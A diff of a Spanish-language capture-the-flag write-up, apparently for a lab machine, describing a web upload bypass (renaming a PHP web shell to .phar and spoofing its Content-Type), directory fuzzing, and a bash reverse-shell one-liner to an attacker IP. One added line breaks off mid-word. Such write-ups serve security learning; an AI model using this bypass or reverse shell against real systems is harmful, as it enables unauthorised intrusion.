@@ -140,7 +140,9 @@ usaremos el repositorio [github](https://github.com/flozz/p0wny-shell?source=pos
 cambiamos la extensión del archivo shell.png a shell.phar y modificamos el `content-Tyoe` para que sea un application/x-php
 ![[Pasted image 20240412233144.png]]
 
-ok. parece que ha aceptado el archivo. ahora solo debemos buscar el directorio donde 
+ok. parece que ha aceptado el archivo. ahora solo debemos buscar el directorio donde se esta guardando. para ello haremos fuzzing
+![[Pasted image 20240412232205.png]]
+el ar
 
 de esta manera obtenemos una shell que nos permite interactuar de manera mas facil con el sistema. y aprovechando esto usaremos el comando `bash -c "bash -i >& /dev/tcp/10.10.14.137/9001 0>&1"` para obtener una reverse shell mas estable
 ![[Pasted image 20240412232653.png]]
